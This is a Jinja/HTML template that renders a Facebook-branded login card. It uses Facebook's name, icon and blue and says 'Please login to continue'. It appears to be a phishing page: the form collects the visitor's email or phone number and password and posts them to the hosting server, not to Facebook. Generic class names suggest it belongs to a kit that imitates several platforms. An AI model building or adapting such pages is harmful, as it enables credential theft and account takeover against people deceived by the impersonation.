{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;font-weight:700;">Facebook</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue</div>
    </div>
  </div>

  <form method="post" style="display:flex;flex-direction:column;gap:10px;margin-top:22px;">
    <input 
      class="input"
      name="address"
      placeholder="Mobile number or email address"
      required
      style="
        padding:16px 18px;
        border-radius:50px;
        border:1px solid #e5e7eb;
        font-size:15.5px;
        background:#fff;
        box-shadow:0 6px 16px rgba(2,6,23,0.06);
        transition:all 0.25s ease;
      "
    >
    <input 
      class="input"
      name="password"
      type="password"
      placeholder="Password"
      required
      style="
        padding:16px 18px;
        border-radius:50px;
        border:1px solid #e5e7eb;
        font-size:15.5px;
        background:#fff;
        box-shadow:0 6px 16px rgba(2,6,23,0.06);
        transition:all 0.25s ease;
      "
    >

    <div class="center" style="margin-top:12px;">
      <button 
        class="btn btn-blue" 
        type="submit"
        style="
          width:100%;
          max-width:340px;
          padding:16px;
          border-radius:50px;
          font-size:16px;
          font-weight:600;
          background:#1877F2;
          color:#fff;
          box-shadow:0 8px 25px rgba(24,119,242,0.25);
          transition:all 0.25s ease;
          border:none;
        "
        onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 12px 30px rgba(24,119,242,0.35)'"
        onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 8px 25px rgba(24,119,242,0.25)'"
      >
        Log in
      </button>
    </div>
  </form>
</div>
{% endblock %}
